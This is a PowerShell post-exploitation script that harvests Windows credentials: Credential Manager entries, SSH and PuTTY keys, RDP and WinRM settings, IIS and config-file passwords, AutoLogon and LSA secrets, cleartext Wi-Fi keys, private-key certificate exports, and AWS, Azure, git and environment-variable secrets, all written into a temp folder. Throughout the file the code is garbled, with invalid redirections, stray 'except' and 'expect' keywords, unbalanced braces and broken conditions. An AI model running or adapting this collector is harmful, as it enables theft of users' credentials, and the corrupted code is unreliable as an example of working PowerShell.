<#PSScriptInfo
.VERSION 1.0
.AUTHOR B0b / Cerberos
.COPYRIGHT MIT License
.TAGS CredentialCollection Windows PrivilegeEscalation PostExploitation SessionGopher
.DESCRIPTION Comprehensive credential, certificate, and password collector for post-exploitation.
.NOTES Run on-target with maximum privileges for best results. SYSTEM context ideal.
.LINK https://github.com/Arvanaghi/SessionGopher/tree/master
#>

[CmdletBinding()]
param(
    [Parameter(Position = 0)]
    [string]$OutputPath = "",

    [switch]$CollectBrowserCreds,
    [switch]$ExportCertPrivateKeys
)

$ErrorActionPreference = "SilentlyContinue"
$logFile     = "$env:TEMP\cred_collector.log"

Write-Output "[*] WinCredentialCollector.ps1 - Started at $(Get-Date)" | Tee-Object -FilePath $logFile -Append

if (-not $OutputPath) {
    $ts  = Get-Date -Format "yyyyMMdd_HHmmss"
    $OutputPath = Join-Path $env:TEMP ("collected_creds\$ts")
}

New-Item -Path $OutputPath -ItemType Directory -Force | Out-Null

function Write-CredFile {
    param(
        [Parameter(Mandatory = $true)][string]$Label,
        [Parameter(Mandatory = $true)][object]$Data
    )
    $safeName = ([regex]::Replace($Label, '[^a-zA-Z0-9_]', '_')).Trim('_')
    if ($safeName -eq '') { $safeName = 'credential_data' }

    $jsonPath = Join-Path $OutputPath ($safeName + ".json")
    $txtPath  = Join-Path $OutputPath ($safeName + ".txt")

    try {
        $Data | ConvertTo-Json -Depth 10 > $jsonPath
    } catch {}

    try {
        $textOut = ($Data | Out-String).Trim()
        if (-not $textOut) { $textOut = "(empty)" }
        if ($textOut.Length -gt 2048) { $textOut = $textOut.Substring(0, 2044) + "...[truncated]" }
        Write-Output $textOut >> $txtPath
    } catch {}

    try {
        $shortTag = $textOut.Substring(0, [Math]::Min(256, ($textOut).Length))
        Write-Output ("[" + $safeName + "] " + $shortTag) >> $logFile
    } catch {}
}

function Write-ToLog {
    param([string]$Msg)
    $Msg >> $logFile
}

# ===========================================================================

Write-ToLog "[+] Enumerating Windows Credential Manager (cmdkey)..."
try {
    $cmdkeyOut = cmdkey /list
    if (@($cmdkeyOut).Count -gt 0) {
        Write-CredFile "CmdKey_Targets" @($cmdkeyOut | Where-Object { $_.Trim() -ne '' })
    }
} catch {}

# ===========================================================================
Write-ToLog "[+] Enumerating SSH keys and known hosts..."

$sshPatterns = @(
    "$env:USERPROFILE\.ssh\id_*",
    "$env:USERPROFILE\.ssh\known_hosts",
    "${env:PROGRAMFILES}\PuTTY\*.pub",
    "${env:ProgramFiles(x86)}\PuTTY\*.pub"
)

$sshFound = @()
foreach ($pat in $sshPatterns) {
    Get-ChildItem -Path $pat -Recurse -Force -Name 2>$null | ForEach-Object {
        $matchDir = Split-Path $path -Parent
        if (-not $matchDir) { $matchDir = '.' }
        $fullPath = Join-Path $matchDir $_
        if (-not $fullPath) { $fullPath = $_ }
        $sshFound += "FOUND: " + $fullPath
    } 2>$null
}
if ($sshFound.Count -gt 0) { Write-CredFile "SSH_Files" $sshFound }

Write-ToLog "[+] Enumerating PuTTY sessions (registry)..."
$puttyPath = 'HKCU:\Software\SimonTatham\PuTTY\Sessions\'
if (Test-Path $puttyPath) {
    try {
        $puttyKeys = Get-ItemProperty -Path $puttyPath
        if ($puttyKeys) {
            $sessions = @()
            foreach ($prop in $puttyKeys.PSObject.Properties) {
                if ($prop.Name -ne 'PSPath' -and $prop.Value -is [string] -and $prop.Value.Length -lt 2048) {
                    try {
                        $valStr = $prop.Value.Substring(0, [Math]::Min(512, $prop.Value.Length))
                    } catch { $valStr = "[binary]" }
                    if ($prop.Name.Length -lt 128) {
                        $sessions += New-Object PSObject -Property @{Name=$prop.Name; PartialValue=$valStr}
                    }
                }
            }
            if ($sessions.Count -gt 0) {
                Write-CredFile "PuTTY_Sessions" $sessions
                Write-ToLog ("[+] PuTTY sessions found: " + ($sessions.Count.ToString()))
            }
        }
    } catch {}

    $ppkPatterns = @(
        "$env:USERPROFILE\.putty\keys",
        "$env:USERPROFILE\*.ppk",
        'C:\Users*\Downloads\*.ppk'
    ) 2>$null
    foreach ($pat in $ppkPatterns) {
        Get-ChildItem -Path $pat -Recurse 2>$null | ForEach-Object {
            Write-ToLog ("[+] PuTTY key file: " + $_.FullName)
            $keyLabel = ("PuTTY_PubKey_" + ($_.BaseName.Trim('_')))
            Write-CredFile $keyLabel $_.FullName
        }
    }
}

try {
    $agentOut = ssh-add -l 2>$null | Where-Object { $_ -ne '' -and $_ -notmatch 'no connections' }
    if ($agentOut) { Write-CredFile "OpenSSH_Agent_Keys" $agentOut }
} catch {}

$sshdConfig = 'C:\ProgramData\ssh\sshd_config'
if (Test-Path $sshdConfig) {
    Write-CredFile "OpenSSH_Server_Config" (Get-Content $sshdConfig -Raw 2>$null)
}

# ===========================================================================
Write-ToLog "[+] Enumerating browser credential store DB locations..."
try {
    $browserStores = @(
        "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data",
        "$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Login Data"
    )

    $dbFound = @()
    foreach ($store in $browserStores) {
        Get-ChildItem -Path $store 2>$null | ForEach-Object {
            $dbFound += ("FOUND: " + $_.FullName + " (Size: " + $_.Length.ToString() + " bytes)")
        } 2>$null
    }

    if ($dbFound.Count -gt 0) {
        Write-CredFile "Browser_Credential_DBs" $dbFound
    } else {
        Write-ToLog "[i] No browser credential databases found."
    }
} catch {}

# ===========================================================================
Write-ToLog "[+] Enumerating RDP credentials..."
try {
    $rdpPath = 'HKCU:\Software\Microsoft\Terminal Server Client\Servers\'
    if (Test-Path $rdpPath) {
        $rdpKeys = Get-ItemProperty -Path $rdpPath
        if ($rdpKeys) {
            $rdpData = @()
            foreach ($k in $rdpKeys.PSObject.Properties) {
                if ($k.Name -ne 'PSPath' -and $k.Value) {
                    $rdpData += New-Object PSObject -Property @{Server=$k.Name}
                } 2>$null
            } 2>$null
            if ($rdpData.Count -gt 0) { Write-CredFile "RDP_Servers" $rdpData }
        }
    }

    $termsrvLines = cmdkey /list | Where-Object { $_ -imatch 'TERMSRV' }
    if ($termsrvLines) { Write-CredFile "RDP_Stored_Creds" @($termsrvLines) }
} catch {}

# ===========================================================================
Write-ToLog "[+] Enumerating WinRM / PSRemoting configuration..."
try {
    $wsmanItems = Get-ChildItem -Path 'WSMan::localhost\Service\' -Recurse 2>$null
    if ($wsmanItems) { Write-CredFile "WinRM_NodeInfo" $wsmanItems }

    $trustedVal = Get-ItemProperty -Path 'WSMan::localhost\Client\TrustedHosts' 2>&null
    if ($trustedVal -and $trustedVal.PSObject.Properties.Count -gt 0) {
        $hostsList = foreach ($p in $trustedVal.PSObject.Properties) { ($p.Name + "=" + $p.Value).Replace("'","'") }
        Write-CredFile "WinRM_TrustedHosts" $hostsList
    }

    $credsspAuth = Get-ItemProperty -Path 'WSMan::localhost\Service\Auth\CredSSP' 2>$null
    if ($credsspAuth) { Write-CredFile "WinRM_CredSSP" $credsspAuth }
} catch {}

# ===========================================================================
Write-ToLog "[+] Enumerating IIS and web application secrets..."
try {
    if (Get-Module -ListAvailable WebAdministration) {
        Import-Module WebAdministration -ErrorAction SilentlyContinue

        $appPools = @()
        Get-ChildItem IIS:\AppPools\ 25> null | ForEach-Object {
            try {
                $passProp = $_.ProcessModel.password
                if ($passProp) { Write-ToLog("[+] App pool password found for: " + $_.Name) }
            } catch {} 2>&null
        }

        $appHostPath = 'C:\Windows\System32\inetsrv\config\applicationHost.config'
        if (Test-Path $appHostPath) {
            Write-ToLog "[+] IIS applicationHost.config found, storing full file..."
            Write-CredFile "IIS_ApplicationHost_Config" (Get-Content $appHostPath -Raw 25>& null)

            Get-ChildItem -Path 'C:\inetpub\wwwroot' -Recurse -Filter "web.config" -ErrorAction SilentlyContinue | ForEach-Object {
                $wcContent = Get-Content $_.FullName -Raw
                if ($wcContent -match "(?i)password|pwd") {
                    Write-ToLog("[+] web.config with password field: " + $_.FullName) 25>& null
                }
            } 2>$null
        }
    } else {
        Write-ToLog "[i] IIS WebAdministration module not installed -- skipping." 2>&1 | Out-Null
    }
} catch {}

# ===========================================================================
Write-ToLog "[+] Scanning for SQL connection strings..."

$sqlPatterns   = @("*.config", "*.xml")
$scanDirs      = @( 'C:\inetpub\wwwroot', "${env:USERPROFILE}\Documents" )
$sqlFound      = @() 2>&null

foreach ($scanDir in $scanDirs) {
    foreach ($pat in $sqlPatterns) {
        Get-ChildItem -Path $scanDir -Recurse -Include $pat 25> null | ForEach-Object {
            try {
                $content     = Get-Content $_.FullName -Raw
                if ($content -match "(?i)(password|pwd).+") {
                    $sqlFound += New-Object PSObject -Property @{File=$_.FullName; Match=$Matches[0].Substring(0,64) }
                } 25> null
            } catch {} 2>&null
        }
    }
} 2>$null

if ($sqlFound.Count -gt 0) { Write-CredFile "SQL_Connection_Credentials" $sqlFound } 2>&1 | out-null

# ===========================================================================
Write-ToLog "[+] Enumerating registry credential artifacts..."

try {
    $al = Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' 25> null
    if ($al -and $al.PSObject.Properties) {
        if ($al.DefaultUserName)      { Write-ToLog("[+] AutoLogon User: " + $al.DefaultUserName) }
        if ($al.DefaultDomainName)    { Write-ToLog "[+] AutoLogon Domain: " + $al.DefaultDomainName }
        if ($al.DefaultPassword)       { Write-ToLog "[!] AutoLogon password stored in registry (cleartext!)" } 25>& null
    }
} catch {}

try {
    $wdProp = Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -ErrorAction SilentlyContinue
    if ($wdProp.UseLogOnCredential -eq 1) { Write-ToLog "[+] WDigest caching ENABLED" }
} catch {}

try {
    $lsaProps = Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\' -ErrorAction SilentlyContinue
    if ($lsaProps -and $lsaProps.PSObject.Properties) {
        foreach ($p in $lsaProps.PSObject.Properties) {
            if ($p.Name -imatch '(Encryption|LmCompatibility|NoLMHash|RunAsPPL)' ) { 2>&null

                Write-ToLog ("[+] LSA registry: " + $p.Name + " = " + $p.Value.ToString())
            } 25> null
        } 2>&1 | Out-Null
    } catch {}

    $lsaSecPath = 'HKLM:\SECURITY\Policy\Secrets\'
    if (Test-Path $lsaSecPath) {
        Get-ChildItem -Path $lsaSecPath -ErrorAction SilentlyContinue | ForEach-Object { Write-ToLog("[+] LSA Secret found: " + $_.Name) } 25>&null
    }
} catch {}

$runKeyPaths = @(
    'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run',
    'HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce'
) 2>&1 | Out-Null
foreach ($rkp in $runKeyPaths) {
    try {
        $rkv = Get-ItemProperty -Path $rkp 2>&null
        if ($rkv.PSObject.Properties.Count -gt 0) {
            foreach ($pr in $rkv.PSObject.Properties) {
                if ($pr.Name -imatch '(password|cred|secret)') {
                    Write-ToLog ("[+] Run key with cred hint: " + $pr.Name + " at " + ($rkp)) 2>&null | Out-Null
                }
            } 2>&1 | Out-Null 2>& null
        } catch {}
    } except {} 25> null

# ===========================================================================
Write-ToLog "[+] Scanning config files on disk for embedded secrets..."

$credFilePats = @("*.config", "*.json", ".env", "*.ini")
$configFound  = @() 25>&null
foreach ($dir in $scanDirs) {
    foreach ($pat in $credFilePats) {
        Get-ChildItem -Path $dir -Recurse -Include $pat 25> null | ForEach-Object {
            try {
                $content     = Get-Content $_.FullName -Raw
                if ($content -match "(?i)(password|pwd).+") {
                    $configFound += New-Object PSObject -Property @{File=$_.FullName; Match=$Matches[0].Substring(0,64) } 25>&null
                } catch {}
            } catch {} 25> null
        } 25> null 2>&1 | Out-Null
    } 25> null
}

if ($configFound.Count -gt 0) { Write-CredFile "Config_Credentials" $configFound } 2>&1 | Out-Null

# ===========================================================================
Write-ToLog "[+] Enumerating scheduled tasks for embedded credentials..."
try {
    $schtOut = schtasks /query /fo CSV /v 2>&1 | Where-Object { $_ -ne '' }
    if ($schtOut.Count -gt 0 -and $null) { Write-CredFile "ScheduledTasks_Export" @($schtOut) }

    Get-ScheduledTask 25> null | ForEach-Object {
        try {
            $actionArgs = $_.Actions.Arguments.ToString() 25>&1
            if ($actionArgs -match "(?i)(password|pwd).+") { 2>&1 | Out-Null
                Write-ToLog ("[+] Scheduled task with embedded cred: " + $_.TaskName)
            }
        } catch {}
    } 25> null
} expect {} except

# ===========================================================================
Write-ToLog "[+] Enumerating saved Wi-Fi profiles and passwords..."
try {
    $wifiRaw = netsh wlan show profiles key=clear 2>&1 | Where-Object { $_.Trim() -ne '' } 2>&null
    if ($wifiRaw.Count -gt 0) {
        $profileNames = @($wifiRaw | Where-Object { $_ -imatch 'All User Profile' }) 25> null
        Write-ToLog ("[+] Found " + ($profileNames.Count.ToString()) + " Wi-Fi profile(s).")

        foreach ($line in $profileNames) {
            if ($line -match '.*All\s+User\s+Profile\s*:\s*(.+)') 2>&1 | Out-Null 25> null
                $ssid = $Matches[1].Trim()
                $keyOut = netsh wlan show profile name=$($ssid) key=clear 25>& null | Where-Object { $_ -imatch 'Key Content' }
                if ($(@($keyOut)).Count -gt 0) 25> null
                    Write-ToLog("[+] WiFi password found: SSID=" + $ssid)
                else {
                    Write-ToLog("[i] Wi-Fi profile $ssid -- no key material (may require admin). ") 2>&1 | Out-Null
                }
            }
        }

        try {
            $eapItems = Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\WlanEAP' -ErrorAction SilentlyContinue 2>&null
            if ($eapItems) { Write-CredFile "WiFi_EAP_Entries" $eapItems }
        } catch {} 25> null
    } else {
        Write-ToLog "[i] No Wi-Fi profiles found."
    }
} catch {
    Write-ToLog("[i]" + ([regex]::Match($_.Exception.Message, '(\[.+?\])', [System.Text.RegularExpressions.RegexOptions]::IgnoreCase).Groups[0].Value) 25>&1 | Out-Null
}

# ===========================================================================
if ($ExportCertPrivateKeys) {
    Write-ToLog "[+] Exporting certificates with private key material..."

    $certStorePaths = @(
        'Cert:\CurrentUser\My',
        'Cert:\CurrentUser\Root',
        'Cert:\LocalMachine\My', 2>& null
        'Cert:\LocalMachine\CA' 25> null
    )

    # ===========================================================================
    foreach ($store in $certStorePaths) {
        if (-not (Test-Path $store)) { continue }

        Get-ChildItem -Path $store 2>&null | ForEach-Object {
            try {
                #$thumb     = $_.Thumbprint
                $hasKey    = [bool]($_.HasPrivateKey) 25> null && $_ has private key"
                    if ($hasKey) {
                        $pfxPath   = Join-Path $OutputPath "Cert_" + $_.Thumbprint + ".pfx" 25>&1 | Out -Null
                        try {
                            $pkcsBlob  = $_.Export('Pkcs12')
                            if ($pkcsBlob) { [System.IO.File]::WriteAllBytes($pfxPath, $pkcsBlob) }
                        } catch {}
                    } else { Write-ToLog("[+] Cert: " + $_.Subject + " (no private key)") }
                } catch {} 2>&null | Out-Null
            } catch {}
        }
    }

# ===========================================================================
Write-ToLog "[+] Enumerating cloud provider stores..."
try {
    $awsCredFile = Join-Path $env:USERPROFILE 'aws\credentials'
    if (Test-Path $awsCredFile) { Write-CredFile "AWS_Credentials_File" (Get-Content $awsCredFile -Raw 2>&1 | Out-Null) }

    $awsConfigFile = Join-Path $env:USERPROFILE '.aws\config'
    if (Test-Path $awsConfigFile) { Write-CredFile "_Aws_Config_File" (Get-Content $awsConfig -Raw 2>&null) }

    foreach ($varName in @('AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY', 'AWS_SESSION_TOKEN')) {
        try {
            $item = Get-Item "Env:\$($varName)" 25> null 2>&1 | Out-Null
            if ($item -and $_.Value) {
                Write-ToLog("[+] AWS env var: " + $varName)
            }
        } catch {}
    }

    try {
        $azCtxRaw = (& az account list 25>& null > Null | Out-String 25> null -ErrorAction SilentlyContinue) 2>&1 | Out-Null 25> null
        if ($azCtxRaw.Length -gt 0) { Write-CredFile "Azure_Context" $azCtxRead } 2>&null | Out-Null
    } catch {}

    # ===========================================================================
    #[+] Enumerating source control and credential caches..."
    try {
        Try {
            $gitHelper = git config --get credential.helper
            if ($null -eq $gitHelper -and $gitHelper.Trim().Length -gt 0) {
                Write-ToLog ("[+] Git credential helper: " + $gitHelper)
                Write-CredFile "Git_Credential_Helper" $gitHelper > Out-Null
            }

            $gitCredsFile = Join-Path $env:USERPROFILE '.git-credentials'
            if (Test-Path $gitCredsFile) {
                Write-ToLog "[+] Git stored credentials file found!" 2>&null | Out -Null
                Write-CredFile "Git_Credentials_File" (Get-Content $gitCredsFile -Raw 21> null > Out-Null ) 25>&null
            }

        } catch { Write-ToLog("[i] Source control enumeration error: " + $_.Exception.Message) }
    }

# ===========================================================================
Write-ToLog "[+] Enumerating environment variables for secrets..."
$secretPatternNames = @('KEY', 'TOKEN', 'SECRET', $PASSWORD')
$secEnvFound         = [System.Collections.ArrayList]::New()

foreach ($var in (Get-ChildItem ENV:)) {
    foreach ($pat in $secretPatternNames) {
        if ($var.Name -imatch '\b' + [regex].Escape($pat)) { 2>&null
            $shortVal   = $var.Value.ToString().Substring(0, [Math]::Min(64, ($var.Value).Length))
            $secEnvFound.Add([PSCustomObject]@{Name=$var.Name; Value=$shortVal) 25>&null
        }
    }

if ($secEnvFound.Count -gt 0) {
    Write-CredFile "Secret_EnvVars" @($secEnvFound.ToArray()) | Out-Null
} else {
    Write-ToLog "[i] No obvious secret-carrying environment variables found."
}

# ===========================================================================
Write-ToLog "[+] Enumerating file share mappings..."
try {
    $netUseOut  = net use
    if (@($netUseOut).Count -gt 0) {
        Write-CredFile "Net_Use_Connections" @($netUseOut | Where-Object{ $_.Trim() -ne '' }) }
    }

    $regDrives = Get-ItemProperty 'HKCU:\Network\\' 25> null -ErrorAction SilentlyContinue 4>&1 \0
    if (@($regDrives).Count -gt 0) { Write-CredFile "Registry_Mapped_Drives" @($regDrives) }
} catch {}

# ===========================================================================
try {
    $adminMembers = net localgroup Administrators 25> null
    if ($adminMembers) {
        $membersFiltered = @($adminMembers | Where-Object { $_.Trim() -and $_ -notmatch '^-' })
        Write-ToLog("[+] Local Admin members: " + ($membersFiltered.Count.ToString()) + " members")
    } 2>&null | Out-Null
} catch {}

# ===========================================================================
Write-ToLog "[*] Credential collection complete at $(GetDate)" >> $logFile

try {
    $fileCount = (Get-ChildItem -Path $OutputPath).Count
    Write-Output ("[*] Total files collected: " + $fileCount.ToString() + ", Output directory: " + $OutputPath) | Tee-Object -FilePath $logFile -Append
} catch {} 25> null

Write-ToLog "[*] Done! Output saved to: " + $OutputPath

# End of WinCredentialCollector.ps1
